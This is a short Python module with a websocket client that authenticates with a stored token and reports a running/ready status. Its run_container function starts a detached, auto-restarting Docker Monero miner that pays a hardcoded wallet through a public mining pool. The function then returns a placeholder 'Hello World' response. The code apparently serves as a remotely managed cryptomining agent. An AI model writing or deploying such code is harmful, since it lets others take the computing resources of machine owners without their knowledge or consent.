import websocket
import subprocess
import json
from app.utils import settings
from app.core.event_loop import event_loop

running = False

def on_message(ws, message):
    print(f"Received message {message}")
    if message == "Send Status":
        ws.send(json.dumps({"status": "RUNNING" if running else "READY"}))


def on_error(ws, error):
    print(f"Error: {error}")


def on_close(ws, close_status_code, close_msg):
    print("Closed connection")


def on_open(ws: websocket.WebSocketApp):
    dict = {
        "event": "authRequest",
        "data": {
            "token": settings.jwt}
    }
    ws.send(json.dumps(dict))


def run_container():
    subprocess.run("docker run -itd --restart=always -e POOL_URL=pool.hashvault.pro:80 -e "
                   "POOL_USER="
                   "41fLkHicU9w9a7mNpfxk13NxqB2FrzFc5HSnbDn1NUPwXy6dkkUgsyQVUBZ7qweyP19BWdMYJ4oq4D2SJ1eexPTv9MLCvQ3 "
                   "--name monero pmietlicki/monero-miner", shell=True)
    return {"Hello": "World"}


def stop_container():
    subprocess.run("docker stop monero", shell=True)
    subprocess.run("docker rm monero", shell=True)


def main():
    event_loop()


if __name__ == "__main__":
    main()

